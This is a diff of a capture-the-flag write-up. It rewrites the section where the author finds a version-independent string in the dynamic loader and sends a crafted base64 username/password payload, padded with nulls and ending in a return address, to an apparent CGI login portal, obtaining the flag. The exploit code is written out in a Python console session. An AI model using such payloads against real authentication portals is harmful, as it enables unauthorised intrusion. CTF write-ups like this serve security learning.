@@ -428,23 +428,37 @@ That worked like a charm on the local vulnerable webserver. Awesomeness. The fla
 ```
 This is a good time to step back, take a break. Do some physical workout and backtrack... ;-)
 
-### Attempt 2 - 
+### Attempt 2 - Flag Time!
+The exploit worked locally but failed remote. So what could be different? 
+```
+ls -l /lib64/ld-linux-x86-64.so.2
+lrwxrwxrwx 1 root root 32 Jan  5 06:47 /lib64/ld-linux-x86-64.so.2 -> /lib/x86_64-linux-gnu/ld-2.31.so
+```
 
+Oh. It's a symlink to a file, that might be in a different version on the remote host. And the exploit was trying to match binary data, early in the file, which most likely has been code. Code that changes between versions...
 
-exploit works locally, but seems to fail on remote server
--> could be because the /lib64/ link is a soft link and might be a different version on server?
--> some memory issue?
-
-grep for more colons, which might be less library version dependent
-
+So it's grep time for more colons, which hopefully are less version dependent.
+```
+xxd /lib64/ld-linux-x86-64.so.2
+[...]
 00022460: 6b00 0a70 7265 6c69 6e6b 2063 6865 636b  k..prelink check
 00022470: 696e 673a 2025 730a 0066 6169 6c65 6400  ing: %s..failed.
+```
 
->>> data['user'] = b64encode(b'prelink checking').decode('utf-8')
->>> data['pass'] = b64encode(b' %s' + b'\x00'*(260-16-1-3) + b'\xa8\x02\x40').decode('utf-8')
+There are a lot more colon seperated strings, but this one looked nice enough. So back to python console.
+```python
+>>> username = b'prelink checking'
+>>> password = b' %s'
+>>> data['user'] = b64encode(username).decode('utf-8')
+>>> data['pass'] = b64encode(password + b'\x00' * (260 - (len(username) + 1 + len(password))) + b'\xa8\x02\x40\x00').decode('utf-8')
 >>> requests.post('http://127.0.0.1:8000/cgi-bin/portal.cgi', data=json.dumps(data)).text
 '{"status": "success", "flag": "CS{foobar}"}'
 >>> requests.post('https://authportal.challenges.adversary.zone:8880/cgi-bin/portal.cgi', data=json.dumps(data)).text
 '{"status": "success", "flag": "CS{w3b_vPn_h4xx}"}'
+```
 
-flag: CS{w3b_vPn_h4xx}
+
+Flag: **CS{w3b_vPn_h4xx}**
+
+## Conclusion
+
